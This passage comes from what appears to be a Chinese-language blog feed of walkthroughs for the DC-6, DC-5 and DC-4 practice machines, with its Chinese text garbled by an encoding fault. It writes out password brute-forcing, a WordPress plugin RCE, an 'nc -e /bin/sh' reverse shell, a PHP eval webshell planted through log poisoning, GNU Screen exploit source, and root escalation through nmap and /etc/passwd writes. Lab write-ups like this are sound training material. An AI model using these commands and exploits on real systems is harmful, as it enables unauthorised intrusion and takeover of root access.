<blockquote>
<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ wpscan â€“url wordy -U username.txt -P passwords_DC6.txt </p>
<p>[!] Valid Combinations Found:<br> | Username: mark, Password: helpdesk01</p>
</blockquote>
<p>å¾—åˆ°<code>mark    helpdesk01</code></p>
<p>çœ‹çœ‹è¿™ä¸ªè´¦å·èƒ½ä¸èƒ½è¿›å…¥åå°    ï¼ŒæˆåŠŸè¿›å…¥åå°</p>
<p>è¿›å…¥åå°ä¸€ç›´æ²¡æ‰¾åˆ°åˆ‡å…¥ç‚¹ï¼Œçœ‹äº†ä¸‹ç½‘ä¸Šçš„ï¼Œä»Activity monitoræ’ä»¶ä¸ºçªç ´å£</p>
<p>å»æ¼æ´åº“çœ‹çœ‹æœ‰å•¥æ¼æ´å¯ä»¥åˆ©ç”¨</p>
<blockquote>
<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ searchsploit Activity monitor</p>
<hr>
<p> Exploit Title                       |  Path</p>
<hr>
<p>Activity Monitor 2002 2.6 - Remote D | windows/dos/22690.c<br>RedHat Linux 6.0/6.1/6.2 - â€˜pam_cons | linux/local/19900.c<br>WordPress Plugin Plainview Activity  | php/webapps/45274.html</p>
<hr>
<p>Shellcodes: No Results</p>
</blockquote>
<br>

<blockquote>
<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ sudo cp /usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</p>
</blockquote>
<p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸ªActivity monitoræ’ä»¶çš„RCE,æ‰§è¡Œç‚¹åœ¨<code>TOOLS</code>ä¸‹çš„<code>IP or interger</code></p>
<p>æå‰ç›‘å¬kaliçš„ç«¯å£<code>nc -nlvp 8888</code></p>
<p>ä½¿ç”¨burpæŠ“åŒ…</p>
<p><img src="/posts/e38f4498/nc1.png"><br><img src="/posts/e38f4498/nc2.png"></p>
<br>

<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p>è¿”å›/home çœ‹åˆ°æœ‰å››ä¸ªç”¨æˆ·ï¼Œ</p>
<blockquote>
<p><strong>cd mark</strong></p>
<p><strong>cd stuff</strong></p>
<p><strong>cat things-to-do.txt</strong></p>
<p>cat things-to-do.txt<br>Things to do:</p>
<ul>
<li>Restore full functionality for the hyperdrive (need to speak to Jens)</li>
<li>Buy present for Sarahâ€™s farewell party</li>
<li>Add new user: graham - GSo7isUM1D4 - done</li>
<li>Apply for the OSCP course</li>
<li>Buy new laptop for Sarahâ€™s replacement</li>
</ul>
</blockquote>
<p>å‘ç°ä¸€ä¸ªè´¦æˆ· <code>graham - GSo7isUM1D4</code></p>
<blockquote>
<p>www-data@dc-6:/home/mark/stuff$ su graham<br>su graham<br>Password: GSo7isUM1D4</p>
<p>graham@dc-6:/home/mark/stuff$</p>
</blockquote>
<p>ææƒ</p>
<p>ä¹Ÿå¯ä»¥å°è¯•ä½¿ç”¨sshç™»å½•</p>
<p><code>kali@kali2020:~$ ssh graham@192.168.18.137</code></p>
<blockquote>
<p>graham@dc-6:~$ sudo -l<br>Matching Defaults entries for graham on dc-6:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User graham may run the following commands on dc-6:<br>    (jens) NOPASSWD: /home/jens/backups.sh</p>
</blockquote>
<p><code>home/jens</code>ä¸‹å¯ä»¥ä¸éœ€è¦å¯†ç æ‰§è¡Œ</p>
<blockquote>
<p>graham@dc-6:~$ cd ../<br>graham@dc-6:/home$ ls<br>graham  jens  mark  sarah<br>graham@dc-6:/home$ </p>
</blockquote>
<p>å‘<code>bacjuos.sh</code>å†™å…¥ <code>/bin/bash</code></p>
<blockquote>
<p>graham@dc-6:/home/jens$ echo /bin/bash &gt;&gt; backups.sh<br>graham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/â€˜ from member names<br>/home/jens/backups.sh: line 3: â€œ/bin/bashâ€: No such file or directory<br>jens@dc-6:~$ </p>
</blockquote>
<p>æˆåŠŸåˆ‡æ¢åˆ°jensç”¨æˆ·</p>
<p><code>sudo -l</code> è·å–jensæƒé™</p>
<blockquote>
<p>jens@dc-6:~$ sudo -l<br>Matching Defaults entries for jens on dc-6:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User jens may run the following commands on dc-6:<br>    (root) NOPASSWD: /usr/bin/nmap</p>
</blockquote>
<p>å‘ç°å¯ä»¥å…å¯†ä½¿ç”¨nmap</p>
<p>nmapææƒå‚è€ƒ<code>https://gtfobins.github.io/gtfobins/nmap/</code></p>
<p>nmapæŸ¥çœ‹ç‰ˆæœ¬</p>
<blockquote>
<p>jens@dc-6:~$ nmap -V</p>
<p>Nmap version 7.40 ( <a href="https://nmap.org/">https://nmap.org</a> )<br>Platform: x86_64-pc-linux-gnu<br>Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6<br>Compiled without:<br>Available nsock engines: epoll poll select</p>
</blockquote>
<br>

<blockquote>
<p>TF=$(mktemp)<br>echo â€˜os.execute(â€œ/bin/shâ€)â€™ &gt; $TF<br>sudo nmap â€“script=$TF</p>
</blockquote>
<p>æ‰§è¡Œäº†ä¸€ä¸‹ï¼Œç»“æœé¶æœºå´©äº†ï¼Œé‡ç½®ä¸€ä¸‹</p>
<p>é¶æœºipæ”¹æˆäº†192.168.18.139</p>
<p>sshè¿æ¥  <code>graham - GSo7isUM1D4</code></p>
<p><code>kali@kali2020:~$ ssh graham@192.168.18.139</code></p>
<blockquote>
<p>raham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/â€˜ from member names<br>/home/jens/backups.sh: line 3: â€œ/bin/bashâ€: No such file or directory<br>jens@dc-6:~$ </p>
</blockquote>
<blockquote>
<p>TF=$(mktemp)<br>echo â€˜os.execute(â€œ/bin/shâ€)â€™ &gt; $TF<br>sudo nmap â€“script=$TF</p>
</blockquote>
<p>æˆåŠŸä¸Šå‡ä¸ºrootæƒé™,è¿›å…¥/rootå¾—åˆ°flag<br><img src="/posts/e38f4498/flag.png"></p>
<br>

<br>

<p>æ€»ç»“</p>
<ul>
<li><p>wpscançˆ†ç ´</p>
</li>
<li><p>Activity monitor RCE</p>
</li>
<li><p>ncåå¼¹shell</p>
</li>
<li><p>sshè¿æ¥</p>
</li>
<li><p>nmapææƒ</p>
</li>
</ul>
<br>

<br>


<p>Reference</p>
<blockquote>
<p><a href="https://gtfobins.github.io/gtfobins/nmap">https://gtfobins.github.io/gtfobins/nmap</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges5</title>
    <url>/posts/7a861522/</url>
    <content><![CDATA[<p>ç¯å¢ƒ</p>
<blockquote>
<p>ç½‘æ®µ 192.168.18.0/24</p>
<p>kali      192.168.18.131</p>
<p>é¶æœº  192.168.18.136</p>
</blockquote>
<p>nmapæ‰«ç½‘æ®µ</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap -sn 192.168.18.0/24<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-03 13:51 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.136<br>Host is up (0.00035s latency).<br>MAC Address: 00:0C:29:DA:A0:32 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00044s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 4.25 seconds</p>
</blockquote>
<p>nmapæ‰«é¶æœºç«¯å£</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.136 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-03 13:56 CST<br>Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br>Service scan Timing: About 66.67% done; ETC: 13:56 (0:00:06 remaining)<br>Nmap scan report for 192.168.18.136<br>Host is up (0.0015s latency).<br>Not shown: 65532 closed ports<br>PORT      STATE SERVICE VERSION<br><strong>80/tcp    open  http    nginx 1.6.2</strong><br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>60416/tcp open  status  1 (RPC #100024)<br>MAC Address: 00:0C:29:DA:A0:32 (VMware)</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds</p>
</blockquote>
<p>å¼€æ”¾äº†80ã€111å’Œ60416,80ç«¯å£ä½¿ç”¨çš„nginx</p>
<p>dirsearchæ‰«ç›®å½•<code>python3 dirsearch.py  -u 192.168.18.136</code></p>
<blockquote>
<p>[14:06:36] Starting:<br>[14:06:43] 200 -    4KB - /contact.php<br>[14:06:43] 301 -  184B  - /css  -&gt;  <a href="http://192.168.18.136/css/">http://192.168.18.136/css/</a><br>[14:06:44] 200 -    6KB - /faq.php<br>[14:06:45] 301 -  184B  - /images  -&gt;  <a href="http://192.168.18.136/images/">http://192.168.18.136/images/</a><br>[14:06:45] 403 -  570B  - /images/<br>[14:06:45] 200 -    4KB - /index.php<br>[14:06:48] 200 -  852B  - /thankyou.php                               </p>
</blockquote>
<p>è¿›å…¥ä¸»é¡µæ²¡çœ‹åˆ°å•¥æç¤ºï¼Œåªæœ‰ä¸€ä¸ªç•™è¨€æ¿ï¼Œéšä¾¿å¡«ä¸€ä¸‹çœ‹çœ‹æœ‰å•¥ä¸œè¥¿</p>
<p>æŠ“åŒ…å‘é€æ•°æ®ï¼Œå‘ç°å¤šæ¬¡å‘é€ä¸‹é¢çš„<code>Copyright Â© 2019</code>ä¼šå˜åŒ–</p>
<p>å¯ä»¥æ¨æµ‹ä½¿ç”¨äº†footer.phpï¼Œè®¿é—®footer.phpæ—¶å¹´ä»½ä¼šæ”¹å˜</p>
<p>è®¿é—®<code>http://192.168.18.136/footer.php</code>ï¼Œå¹´ä»½ä¼šå˜åŒ–</p>
<p>å¯ä»¥æ¨æµ‹thankyou.phpåŒ…å«äº†footer.php</p>
<p>è¯•ä¸€ä¸‹file=index.php<br><img src="/posts/7a861522/burp_fileindex.png"><br><img src="/posts/7a861522/file_index.png"><br><img src="/posts/7a861522/burp_fileetcpasswd.png"><br><br></p>
<p>ç”±äºæ—¶nginx,è®¿é—®ä¸‹ä»–çš„æ—¥å¿—</p>
<p><code>/var/log/nginx/error.log</code><br><img src="/posts/7a861522/burp_errorlog.png"><br><code>/var/log/nginx/access.log </code><br><img src="/posts/7a861522/burp_accesslog.png"><br>å°è¯•å†™å…¥æ—¥å¿—æ–‡ä»¶æ¥åå¼¹shell<br><img src="/posts/7a861522/burp_eval.png"><br><code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;])?&gt;;</code><br><img src="/posts/7a861522/burp_phpinfo.png"><br>ä½¿ç”¨èšå‰‘è¿æ¥shell<br><img src="/posts/7a861522/antsword.png"><br>whoamiæŸ¥çœ‹æƒé™ä¸º<code>www-data</code>æ²¡æœ‰æƒé™å»è®¿é—®/root</p>
<p>ncå‘½ä»¤åå¼¹shell<br><img src="/posts/7a861522/nc_shell.png"><br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><br><br>ææƒ</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<blockquote>
<p>www-data@dc-5:~/html$ find / -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>/bin/su<br>/bin/mount<br>/bin/umount<br>/bin/screen-4.5.0<br>/usr/bin/gpasswd<br>/usr/bin/procmail<br>/usr/bin/at<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/sbin/exim4<br>/sbin/mount.nfs</p>
</blockquote>
<p>ä½¿ç”¨screen</p>
<blockquote>
<p>kali@kali2020:~$ searchsploit screen 4.5.0</p>
<hr>
<p> Exploit Title                            |  Path</p>
<hr>
<p>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41152.txt<br>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41154.sh</p>
<hr>
<p>Shellcodes: No Results<br>kali@kali2020:<del>/Tools$ cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh<br>kali@kali2020:</del>/Tools$ cat 41154.sh </p>
</blockquote>
<p>æ ¹æ®è¯´æ˜ç¬¬ä¸€éƒ¨åˆ†ä¿å­˜ä¸º<code>libhax.c</code></p>
<blockquote>
<p>#include &lt;stdio.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;unistd.h&gt;<br><strong>attribute</strong> ((<strong>constructor</strong>))<br>void dropshell(void){<br>    chown(â€œ/tmp/rootshellâ€, 0, 0);<br>    chmod(â€œ/tmp/rootshellâ€, 04755);<br>    unlink(â€œ/etc/ld.so.preloadâ€);<br>    printf(â€œ[+] done!\nâ€);<br>}</p>
</blockquote>
<p>ç¬¬äºŒéƒ¨åˆ†ä¿å­˜ä¸º<code>rootshell.c</code></p>
<blockquote>
<p>#include &lt;stdio.h&gt;<br>int main(void){<br>    setuid(0);<br>    setgid(0);<br>    seteuid(0);<br>    setegid(0);<br>    execvp(â€œ/bin/shâ€, NULL, NULL);<br>}</p>
</blockquote>
<p>ç¼–è¯‘</p>
<p><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></p>
<p><code>gcc -o rootshell rootshell.c</code></p>
<p>å°†ç¬¬ä¸‰éƒ¨åˆ†ä¿å­˜ä¸ºexp.sh</p>
<br>

<br>

<p>æŠŠä¸‰ä¸ªæ–‡ä»¶é€šè¿‡èšå‰‘ä¼ åˆ°é¶æœºä¸­<br><img src="/posts/7a861522/upload.png"><br><img src="/posts/7a861522/exp.png"><br><img src="/posts/7a861522/flag.png"></p>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges4</title>
    <url>/posts/d8125b4/</url>
    <content><![CDATA[<ul>
<li>ç¯å¢ƒ</li>
</ul>
<blockquote>
<p>ç½‘æ®µ 192.168.18.0/24<br>kali   192.168.18.131<br>é¶æœº 192.168.18.135</p>
</blockquote>
<p>nmapæ‰«æç½‘æ®µ</p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-02 11:06 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00038s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.135<br>Host is up (0.00022s latency).<br>MAC Address: 00:0C:29:19:21:2F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00016s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.15 seconds</p>
</blockquote>
<p>nmapæ‰«æé¶æœºå¼€æ”¾çš„ç«¯å£</p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.135 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-02 11:09 CST<br>Nmap scan report for 192.168.18.135<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    nginx 1.15.10<br>MAC Address: 00:0C:29:19:21:2F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds</p>
</blockquote>
<p>dirsearchæ‰«ä¸€ä¸‹ç›®å½•</p>
<blockquote>
<p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u 192.168.18.135 </p>
<p>[11:14:19] Starting:<br>[11:14:25] 302 -  704B  - /command.php  -&gt;  index.php<br>[11:14:25] 301 -  170B  - /css  -&gt;  <a href="http://192.168.18.135/css/">http://192.168.18.135/css/</a><br>[11:14:26] 301 -  170B  - /images  -&gt;  <a href="http://192.168.18.135/images/">http://192.168.18.135/images/</a><br>[11:14:26] 403 -  556B  - /images/<br>[11:14:26] 200 -  506B  - /index.php<br>[11:14:27] 302 -  206B  - /login.php  -&gt;  index.php<br>[11:14:27] 302 -  163B  - /logout.php  -&gt;  index.php</p>
</blockquote>
<p>è¿›ä¸»é¡µçœ‹åˆ°ä¸€ä¸ªç™»å½•æ¡†</p>
<p><img src="/posts/d8125b4/index.png"></p>
<p>burpçˆ†ç ´adminå¾—åˆ°å¯†ç <code>happy</code></p>
<p>ç™»å½•åå‘ç°å¯ä»¥æ‰§è¡Œä¸€äº›å‘½ä»¤</p>
<p><img src="/posts/d8125b4/command.png"><br>burpæŠ“åŒ…çœ‹ä¸€ä¸‹<br><img src="/posts/d8125b4/burp_whoami.png"><br><br><br><img src="/posts/d8125b4/burp_catpasswd.png"><br><br><br>åå¼¹shell<br><img src="/posts/d8125b4/kali_nc.png"></p>
<blockquote>
<p>kali@kali2020:~$ nc -lvp 8888</p>
</blockquote>
<p>burpæ”¹åŒ…<br><img src="/posts/d8125b4/burp_nc.png"><br>radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run</p>
<p>ä½¿ç”¨pythonå¾—åˆ°äº¤äº’å¼shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="/posts/d8125b4/shell.png"></p>
<blockquote>
<p>kali@kali2020:~$ nc -lvp 8888<br>listening on [any] 8888 â€¦<br>192.168.18.135: inverse host lookup failed: Unknown host<br>connect to [192.168.18.131] from (UNKNOWN) [192.168.18.135] 48192<br>python -c â€˜import pty;pty.spawn(â€œ/bin/bashâ€)â€™<br>www-data@dc-4:/usr/share/nginx/html$ whoami<br>whoami<br>www-data<br>www-data@dc-4:/usr/share/nginx/html$ </p>
</blockquote>
<p><code>cat /etc/passwd</code></p>
<p>å‘ç°æœ‰ä¸‰ä¸ªç”¨æˆ·</p>
<blockquote>
<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
</blockquote>
<p>çœ‹ä¸‹charlesç”¨æˆ·æœ‰ä»€ä¹ˆ</p>
<blockquote>
<p>**www-data@dc-4:/home$ cd charles **</p>
<p>cd charles<br><strong>www-data@dc-4:/home/charles$ ls</strong><br>ls<br><strong>www-data@dc-4:/home/charles$ ls -l</strong><br>ls -l<br>total 0<br><strong>www-data@dc-4:/home/charles$ cd ls</strong><br>cd ls<br>bash: cd: ls: No such file or directory<br><strong>www-data@dc-4:/home/charles$ cat ls</strong><br>cat ls<br>cat: ls: No such file or directory<br>**www-data@dc-4:/home/charles$ **</p>
</blockquote>
<p>æŸ¥çœ‹jimç”¨æˆ·æœ‰ä»€ä¹ˆ,mboxæ²¡æƒé™è®¿é—®</p>
<blockquote>
<p>**www-data@dc-4:~$ cd /home/jim  **<br>cd /home/jim<br><strong>www-data@dc-4:/home/jim$ ls</strong><br>ls<br>backups  mbox  test.sh</p>
<p><strong>www-data@dc-4:/home/jim$ cat mbox</strong><br>cat mbox<br>cat: mbox: Permission denied<br>**www-data@dc-4:/home/jim$ **<br><strong>www-data@dc-4:/home/jim$ cd backups</strong><br>cd backups<br><strong>www-data@dc-4:/home/jim/backups$ ls</strong><br>ls<br>old-passwords.bak<br><strong>www-data@dc-4:/home/jim/backups$ cat old-passwords.bak</strong><br>cat old-passwords.bak</p>
<p>â€¦ â€¦ </p>
</blockquote>
<p>æŠŠå¯†ç ä¿å­˜åœ¨dc4_passwd.txt</p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo hydra -l jim -P ~/Tools/dc4_passwd.txt ssh://192.168.18.135</p>
<p>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</p>
<p>Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) starting at 2021-05-02 22:25:29<br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 253 login tries (l:1/p:253), ~16 tries per task<br>[DATA] attacking ssh://192.168.18.135:22/<br>[STATUS] 181.00 tries/min, 181 tries in 00:01h, 77 to do in 00:01h, 16 active</p>
<p>[22][ssh] host: 192.168.18.135   login: jim   password: jibril04<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 4 final worker threads did not complete until end.<br>[ERROR] 4 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) finished at 2021-05-02 22:27:02</p>
</blockquote>
<p>å¾—åˆ° <code>jim  jibril04</code></p>
<p>è¿æ¥ssh</p>
<blockquote>
<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#106;&#105;&#x6d;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#49;&#x33;&#x35;">&#106;&#105;&#x6d;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#49;&#x33;&#x35;</a></strong></p>
<p>The authenticity of host â€˜192.168.18.135 (192.168.18.135)â€™ canâ€™t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added â€˜192.168.18.135â€™ (ECDSA) to the list of known hosts.<br><a href="mailto:&#106;&#x69;&#109;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#49;&#x38;&#46;&#49;&#51;&#53;">&#106;&#x69;&#109;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#49;&#x38;&#46;&#49;&#51;&#53;</a>â€˜s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
<p>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.</p>
<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100</p>
<p><strong>jim@dc-4:~$ pwd</strong></p>
<p>/home/jim</p>
<p>##çœ‹çœ‹æœ‰ä»€ä¹ˆå¯ä»¥ä½¿ç”¨çš„rootæƒé™å‘½ä»¤</p>
<p><strong>jim@dc-4:~$ sudo -l</strong></p>
<p>We trust you have received the usual lecture from the local System<br>Administrator. It usually boils down to these three things:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#1) Respect the privacy of others.</span><br><span class="line">#2) Think before you type.</span><br><span class="line">#3) With great power comes great responsibility.</span><br></pre></td></tr></table></figure>

<p>[sudo] password for jim:<br>Sorry, try again.<br>[sudo] password for jim:<br>Sorry, user jim may not run sudo on dc-4.<br>**jim@dc-4:~$ **</p>
<p><strong>jim@dc-4:~$ ls -l</strong><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rwâ€”â€”- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br><strong>jim@dc-4:~$ cat mbox</strong></p>
<p>From root@dc-4 Sat Apr 06 20:20:04 2019<br>Return-path: &lt;root@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000<br>Received: from root by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;root@dc-4&gt;)<br>        id 1hCiQe-0000gc-EC<br>        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000<br>To: jim@dc-4<br>Subject: Test<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=â€UTF-8â€<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;<br>From: root &lt;root@dc-4&gt;<br>Date: Sat, 06 Apr 2019 20:20:04 +1000<br>Status: RO</p>
<p>This is a test.</p>
</blockquote>
<p>å¯ä»¥çœ‹åˆ°jimå‘äº†ä¸€æ¡ç”µå­é‚®ä»¶</p>
<p>å»çœ‹ä¸€ä¸‹./var/mail</p>
<blockquote>
<p><strong>jim@dc-4:~$ cd /var/mail</strong><br><strong>jim@dc-4:/var/mail$ ls</strong><br>jim<br><strong>jim@dc-4:/var/mail$ cd jim</strong><br>-bash: cd: jim: Not a directory<br><strong>jim@dc-4:/var/mail$ cat jim</strong><br>From charles@dc-4 Sat Apr 06 21:15:46 2019<br>Return-path: &lt;charles@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000<br>Received: from charles by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;charles@dc-4&gt;)<br>        id 1hCjIX-0000kO-Qt<br>        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000<br>To: jim@dc-4<br>Subject: Holidays<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=â€UTF-8â€<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;<br>From: Charles &lt;charles@dc-4&gt;<br>Date: Sat, 06 Apr 2019 21:15:45 +1000<br>Status: O</p>
<p>Hi Jim,</p>
<p>Iâ€™m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</p>
<p>Password is:  <strong>^xHhA&amp;hvim0y</strong></p>
<p>See ya,<br>Charles</p>
<p>**jim@dc-4:/var/mail$ **</p>
</blockquote>
<p>å‘ç°äº†Charlesçš„å¯†ç <code>^xHhA&amp;hvim0y</code></p>
<p>suçœ‹çœ‹èƒ½å¦åˆ‡æ¢åˆ°charles</p>
<blockquote>
<p><strong>jim@dc-4:~$ su charles</strong></p>
<p>Password:<br>**charles@dc-4:/home/jim$ **</p>
</blockquote>
<p>çœ‹çœ‹Charlesæœ‰ä»€ä¹ˆå¯ä»¥ä½¿ç”¨çš„rootå‘½ä»¤</p>
<blockquote>
<p><strong>charles@dc-4:~$ sudo -l</strong><br>Matching Defaults entries for charles on dc-4:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User charles may run the following commands on dc-4:<br>    (root) NOPASSWD: /usr/bin/teehee<br>**charles@dc-4:~$ **</p>
</blockquote>
<p>å‘ç°å¯ä»¥ä¸ä½¿ç”¨å¯†ç å°±èƒ½æ‰§è¡Œ<code>teehee</code></p>
<p>æœäº†ä¸€ä¸‹ å¯ä»¥åˆ©ç”¨<code>teehee</code>è¿›è¡Œææƒ</p>
<blockquote>
<p>teeheeå¯é€šè¿‡echo â€œxxxâ€|sudo teehee -a â€˜fileâ€™çš„æ–¹å¼å°†å†…å®¹å†™å…¥åˆ°ç”¨æˆ·æ— æ³•ç›´æ¥æ“ä½œçš„æ–‡ä»¶ä¸­</p>
</blockquote>
<p><img src="/posts/d8125b4/teeheeuser.png"></p>
<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
<p>ä¸ƒä¸ªå­—æ®µ</p>
<p>root:x:0:0:root:/root:/bin/bash</p>
<p>Mamor:x:0:0:::/bin/bash</p>
<p><code>echo &quot;Mamor:x:0:0:::/bin/bash&quot; |sudo teehee -a /etc/passwd</code></p>
<blockquote>
